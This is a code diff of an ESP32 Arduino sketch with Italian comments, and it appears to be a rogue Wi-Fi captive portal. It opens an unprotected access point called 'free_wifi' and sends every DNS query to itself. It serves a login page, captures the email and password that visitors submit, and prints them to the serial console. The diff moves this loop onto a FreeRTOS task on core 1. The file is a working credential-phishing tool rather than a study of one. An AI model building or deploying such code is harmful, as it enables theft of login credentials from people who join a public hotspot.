@@ -4,21 +4,24 @@ ACTIVE MODE
 
 */
 
-#include <WiFi.h>
-#include <DNSServer.h>
-#include <AsyncTCP.h>
-#include "ESPAsyncWebServer.h"
-
-// DEVO USARE L'SD PER SALVARMI LE COSE IN MEMORIA
+DNSServer dnsServer;
+AsyncWebServer httpServer(80);
 
 // access point generato dall'esp
 char *ssid_esp ="free_wifi";
 char *psw_esp = "";
 
-char *psw_bluetooth ="1234";
 
-DNSServer dnsServer;
-AsyncWebServer httpServer(80);
+void loopCore1(void* p){
+  setupESPLocalNetwork(ssid_esp,psw_esp,IPAddress(8,8,8,8), IPAddress(8,8,8,8), IPAddress(255,255,255,0));
+  // handle dns response
+  while (true){
+    dnsServer.processNextRequest();
+    vTaskDelay(1000 / portTICK_PERIOD_MS);
+
+  }
+}
+
 
 const char index_html[] PROGMEM= R"rawliteral(
   <html>
@@ -64,7 +67,6 @@ class CaptiveRequestHandler : public AsyncWebHandler{
     }
 };
 
-
 void setupServerPages(){
   // si setta il comportamento per ogni singola pagina
   httpServer.on("/", HTTP_GET, [](AsyncWebServerRequest *r){
@@ -80,9 +82,9 @@ void setupServerPages(){
     }
     if (r->hasParam("password")){
       inputPassword=r->getParam("password")->value();
-}
+    }
 
-    Serial.println("USER DATA: "+ inputEmail+ " "+ inputPassword);
+    Serial.println("[CORE 1] -> USER DATA: "+ inputEmail+ " "+ inputPassword);
 
     r->send(200,"text/html",login_html);
   });
@@ -98,12 +100,13 @@ void setupESPLocalNetwork(char* ssid,char* psw,IPAddress accesspoint,IPAddress g
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(accesspoint,gateway,subnet);
   while (!WiFi.softAP(ssid,psw)){
-    delay(750);
-    Serial.println("...");
+    vTaskDelay(750 / portTICK_PERIOD_MS);
+
+    Serial.println("[CORE 1] -> ...");
   }
   dnsServer.start(53, "*", WiFi.softAPIP());
   httpServer.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
   setupServerPages();
   httpServer.begin();
-  Serial.println("ESP router IP "+WiFi.softAPIP().toString());
+  Serial.println("[CORE 1] -> ESP router IP "+WiFi.softAPIP().toString());
 }
